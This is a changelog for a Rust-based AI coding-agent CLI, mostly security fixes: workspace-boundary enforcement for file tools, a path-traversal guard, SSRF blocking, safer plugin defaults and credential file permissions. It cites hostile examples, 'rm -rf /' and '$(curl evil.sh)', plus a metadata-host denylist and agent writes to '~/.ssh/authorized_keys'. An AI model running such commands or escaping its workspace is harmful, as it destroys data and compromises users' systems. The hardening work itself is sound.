# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **File-IO tools now enforce the workspace boundary.** `read_file` /
  `write_file` / `edit_file` used to dispatch to the unchecked
  `runtime::file_ops` variants even though the `_in_workspace` variants
  existed (they were sitting behind `#[allow(dead_code)]`). Under
  `read-only` or `workspace-write` modes the model could overwrite any
  path the process could reach (`~/.ssh/authorized_keys`, `/etc/...`).
  The tool dispatch in `crates/tools/src/lib.rs` now threads the active
  permission mode through a new `enforcer_workspace_scope()` helper;
  anything other than `DangerFullAccess` pins the operation to the
  current working directory via the `*_in_workspace` functions. The
  `_in_workspace` functions lost their `#[allow(dead_code)]` and are now
  part of the runtime's public surface.
- **Path-traversal guard precedence bug fixed.** In
  `crates/tools/src/lib.rs:1900`, the token check
  `token.contains("../..") || token.starts_with("../") && !token.starts_with("./")`
  parsed as `A || (B && C)` — a single `../` escape never tripped the
  guard. Added explicit parens so it evaluates as `(A || B) && C`.
- **WebFetch refuses non-http(s) schemes and SSRF targets.**
  `normalize_fetch_url` previously only upgraded http→https. It now
  rejects `file://`, `data:`, `gopher://`, `javascript:`, etc., and
  blocks requests to RFC 1918 private ranges, link-local (169.254.0.0/16
  including all cloud metadata endpoints), CGNAT (100.64.0.0/10), IPv6
  unique-local (fc00::/7), and IPv6 link-local (fe80::/10). Loopback
  stays allowed so local dev servers still work. A denylist of
  well-known metadata hostnames (`metadata.google.internal`,
  `metadata.azure.com`, etc.) catches the DNS-based variants.
- **Plugin default permission is now `read-only`.**
  `default_tool_permission_label()` in `crates/plugins/src/lib.rs`
  previously serde-defaulted to `danger-full-access`, so any plugin that
  omitted `requiredPermission` (or misspelled it) silently received
  unrestricted file/shell access. Authors must now explicitly opt in to
  higher tiers.
- **Plugin tool names can't shadow built-ins.** `aggregated_tools()`
  rejects plugins that declare a tool name reserved by the host (`bash`,
  `read_file`, `write_file`, `edit_file`, `Agent`, `Skill`, `WebFetch`,
  etc.) rather than silently double-dispatching or shadowing.
- **Plugin install URLs restricted to `https://`.**
  `parse_install_source` now refuses `http://`, `git@host:…` (SSH),
  `ssh://`, and `git+` schemes. These used to flow straight into
  `git clone` with the user's SSH key against an arbitrary endpoint.
- **Plugin hook literal commands validated.** `is_literal_command` no
  longer accepts any non-relative-path string — it restricts literals to
  bare alphanumeric program names (plus `-`, `_`, `.`), so a plugin
  manifest can't smuggle `rm -rf /` or `$(curl evil.sh)` through the
  "skip path validation" branch.
- **`RUSTY_CLAUDE_PERMISSION_MODE` override is now surfaced, and unknown
  values no longer crash the CLI.** `permission_mode_from_label` used to
  `panic!` on unrecognized strings. It now returns `Option` and the
  startup path logs a clear `claw: ...` warning to stderr whenever the
  env var override takes effect (suppressed in non-TTY contexts), so an
  unattended session cannot silently escalate to `danger-full-access`.
- **OAuth credentials file written with mode `0600` from creation, not
  the process umask.** `write_credentials_root` in
  `crates/runtime/src/oauth.rs` now opens the temp file via
  `OpenOptions::mode(0o600)`, flushes via `sync_all()`, and tightens the
  parent dir to `0o700` on create. The previous `fs::write` left access
  and refresh tokens world-readable on shared systems.
- **Telemetry JSONL sink created with mode `0600`.**
  `JsonlTelemetrySink::new` no longer relies on the default umask;
  session traces that may embed file paths and HTTP attributes stay
  owner-readable only.
- **Grep tool never follows symlinks.** `collect_search_files` in
  `crates/runtime/src/file_ops.rs` now calls `.follow_links(false)` on
  `WalkDir` and skips any symlink entry, so a symlink pointing at
  `/proc/self/mem` or a sibling directory outside the search root can
  no longer be read.

### Changed

- **HTTP client now has a 30 s connect timeout and TCP keepalive.**
  `build_http_client_with` in `crates/api/src/http_client.rs` previously
  constructed a `reqwest::Client` with zero timeouts, so a hung or
  black-holed upstream could wedge the CLI forever. Added
  `connect_timeout(30 s)`, `pool_idle_timeout(90 s)`, and
  `tcp_keepalive(60 s)`. No total-request timeout yet — streaming SSE
  responses are intentionally long-lived, and the same client is used
  for both send and stream paths.
- **HTTP 409 Conflict is no longer retried.** Both
  `crates/api/src/providers/anthropic.rs` and `…/openai_compat.rs`
  removed `409` from `is_retryable_status`. Conflict is a semantic
  failure (duplicate request id, optimistic concurrency violation) —
  retrying burns the whole budget without ever succeeding.
- **`grok-2` honors context-window preflight.** Added a `model_token_limit`
  entry so requests against Grok 2 are bounded like the rest of the
  registry. Previously `preflight_message_request` silently skipped the
  check for this model.

### Reliability

- **SSE parsers fail closed instead of OOMing.** Both `SseParser::push`
  (`crates/api/src/sse.rs`) and `OpenAiSseParser::push`
  (`crates/api/src/providers/openai_compat.rs`) now return
  `ApiError::InvalidSseFrame` when the buffer exceeds 64 MiB without a
  frame separator, rather than accumulating indefinitely.
- **Telemetry write failures are surfaced.**
  `JsonlTelemetrySink::record` used to swallow both `writeln!` and
  `flush` errors with `let _ =`. It now logs to stderr once per record
  so disk-full / filesystem-gone conditions don't disappear into a
  hole.
- **`worker_boot` state snapshot errors are no longer silent.** Disk /
  permission errors on `fs::write` and `fs::rename` in
  `crates/runtime/src/worker_boot.rs` now log to stderr instead of
  being discarded via `let _ =`, so stale-state bugs caused by a full
  disk are attributable.

### Fixed

- **`resolve_startup_auth_source` actually loads saved OAuth tokens.**
  `crates/api/src/providers/anthropic.rs` used to take a
  `load_oauth_config` closure and immediately discard it with
  `let _ = load_oauth_config;`, so users who authenticated via
  `claude login` (the exact setup the bundled `claw` shell wrapper
  uses) got `MissingCredentials` on every startup unless they also set
  an env var. The closure is now invoked, and saved tokens are
  refreshed in place if expired. `has_auth_from_env_or_saved` now
  actually checks saved creds too.
- **Anthropic preflight no longer rejects small prompts on fresh sessions.**
  The local byte-length heuristic (`bytes / 4 + 1`) used by
  `preflight_message_request` wildly overestimates tokens for JSON-heavy
  payloads — tool schemas and system prompts. On a fresh session with all
  ~60 deferred tools serialized into the request, even a one-word prompt
  like `hi` estimated ~260k tokens and tripped the 200k-window guard
  before anything was sent. The Anthropic `count_tokens` endpoint (the
  authoritative tokenizer) was only consulted *after* the byte guard had
  already rejected the request, so it never got a chance to rescue the
  false positive.

  Fix in `crates/api/src/providers/anthropic.rs` (`preflight_message_request`):
  1. Run the cheap byte estimate first as a fast path — if it says the
     request comfortably fits, skip the network round trip and proceed.
  2. Only when the byte estimate flags the request as oversized, call
     `count_tokens` for the real count. If the real count fits, allow
     the request.
  3. If `count_tokens` is unreachable or returns an unparseable body
     (e.g., third-party Anthropic-compatible gateway), fall back to the
     original byte-estimate error — same safety net as before.

  The matching integration test
  (`crates/api/tests/client_integration.rs ::
  send_message_blocks_oversized_requests_before_the_http_call`) was
  updated: the mock server now returns a `count_tokens` response and the
  assertion checks that no `/v1/messages` request was captured, rather
  than "no request at all". All 12 `api` integration tests pass.
